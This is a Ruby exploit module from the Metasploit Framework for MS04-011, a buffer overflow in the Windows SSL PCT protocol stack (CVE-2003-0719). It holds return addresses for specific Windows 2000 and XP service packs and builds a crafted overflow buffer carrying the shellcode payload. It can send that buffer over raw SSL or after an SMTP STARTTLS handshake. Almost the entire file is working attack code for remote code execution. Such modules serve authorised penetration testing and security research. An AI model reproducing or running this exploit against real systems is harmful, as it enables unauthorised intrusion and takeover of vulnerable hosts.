##
# $Id: ms04_011_pct.rb 10394 2010-09-20 08:06:27Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft Private Communications Transport Overflow',
			'Description'    => %q{
					This module exploits a buffer overflow in the Microsoft
				Windows SSL PCT protocol stack. This code is based on Johnny
				Cyberpunk's THC release and has been tested against Windows
				2000 and Windows XP. To use this module, specify the remote
				port of any SSL service, or the port and protocol of an
				application that uses SSL. The only application protocol
				supported at this time is SMTP. You only have one chance to
				select the correct target, if you are attacking IIS, you may
				want to try one of the other exploits first (WebDAV). If
				WebDAV does not work, this more than likely means that this
				is either Windows 2000 SP4+ or Windows XP (IIS 5.0 vs IIS
				5.1). Using the wrong target may not result in an immediate
				crash of the remote system.
			},
			'Author'         => [ 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10394 $',
			'References'     =>
				[
					[ 'CVE', '2003-0719'],
					[ 'OSVDB', '5250'],
					[ 'BID', '10116'],
					[ 'MSB', 'MS04-011'],

				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 1800,
					'BadChars' => "",
					'StackAdjustment' => -3500,
				},
			'Targets'        =>
				[
					[
						'Windows 2000 SP4',
						{
							'Platform' => 'win',
							'Ret'      => 0x67419ce8, # jmp [esp + 0x6c]
						},
					],
					[
						'Windows 2000 SP3',
						{
							'Platform' => 'win',
							'Ret'      => 0x67419e1d, # jmp [esp + 0x6c]
						},
					],
					[
						'Windows 2000 SP2',
						{
							'Platform' => 'win',
							'Ret'      => 0x6741a426, # jmp [esp + 0x6c]
						},
					],
					[
						'Windows 2000 SP1',
						{
							'Platform' => 'win',
							'Ret'      => 0x77e4f44d, # jmp [ebx + 0x14]
						},
					],
					[
						'Windows 2000 SP0',
						{
							'Platform' => 'win',
							'Ret'      => 0x7658a6cb, # jmp [ebx + 0x0e]
						},
					],
					[
						'Windows XP SP0',
						{
							'Platform' => 'win',
							'Ret'      => 0x0ffb7de9, # jmp [esp + 0x6c]
						},
					],
					[
						'Windows XP SP1',
						{
							'Platform' => 'win',
							'Ret'      => 0x0ffb832f, # jmp [esp + 0x6c]
						},
					],
				],
			'DisclosureDate' => 'Apr 13 2004',
			'DefaultTarget' => 0))

		register_options(
			[
				OptString.new('PROTO', [true, "The application protocol: raw or smtp", "raw"])
			], self.class)
	end

	def exploit
		connect

		print_status("Trying target #{target.name} with proto #{datastore['PROTO']}...")

		# This is a heap ptr to the ssl request
		# ... and just happens to not die ...
		# Thanks to CORE and Halvar
		#
		#   80620101     =>  and byte ptr [esi+1], 0x2
		#   bd00010001   =>  mov ebp, 0x1000100
		#   0016         =>  add [esi], dl
		#   8f8201000000 =>  pop [esi+1]
		#   eb0f         =>  jmp short 11 to shellcode

		buf = "\x80\x66\x01\x02\xbd\x00\x01\x00\x01\x00\x16\x8f\x86\x01\x00\x00\x00"+
			"\xeb\x0f" + 'XXXXXXXXXXX' +
			[target.ret ^ 0xffffffff].pack('V')+
			payload.encoded

		# Connect to a SMTP service, call STARTTLS
		if (datastore['PROTO'] == 'smtp')
			greeting = sock.get_once

			sock.put('HELO ' + (rand_text_alphanumeric(rand(10)+1)) + "\r\n")
			resp = sock.get_once

			sock.put("STARTTLS\r\n")
			resp = sock.get_once

			if (resp and resp !~ /^220/)
				print_status("Warning: this server may not support STARTTLS")
			end

		end

		sock.put(buf)
		resp = sock.get_once

		if (resp == "\x00\x00\x01")
			print_status("The response indicates that the PCT protocol is disabled")
		end

		handler
		disconnect
	end

end